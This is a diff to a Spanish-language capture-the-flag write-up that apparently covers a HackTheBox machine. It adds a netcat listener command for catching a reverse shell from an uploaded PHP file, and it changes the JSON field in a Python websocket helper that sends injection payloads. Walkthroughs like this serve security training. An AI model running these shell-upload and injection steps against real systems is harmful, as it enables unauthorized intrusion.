@@ -148,7 +148,7 @@ Mirando por la página vemos que podemos subir archivos en la carpeta ```/tiny``
 ?>
 ```
 
-Subimos este archivo, activamos netcat con el puerto que hayamos puesto en el script anterior y lo ejecutamos añadiendo /uploads/cmd.php a la url. Así conseguimos una revershell de www-data
+Subimos este archivo, activamos netcat con el puerto ```nc -lnvp 4444``` que hayamos puesto en el script anterior y lo ejecutamos añadiendo /uploads/cmd.php a la url. Así conseguimos una revershell de www-data
 
 Investigando el interior de la plataforma, encontramos en la carpeta ```/etc/nginx/sites-available``` donde esta el archivo soc-player.htb
 
@@ -192,7 +192,7 @@ def send_ws(payload):
 	
 	# For our case, format the payload in JSON
 	message = unquote(payload).replace('"','\'') # replacing " with ' to avoid breaking JSON structure
-	data = '{"employeeID":"%s"}' % message
+	data = '{"id":"%s"}' % message
 
 	ws.send(data)
 	resp = ws.recv()
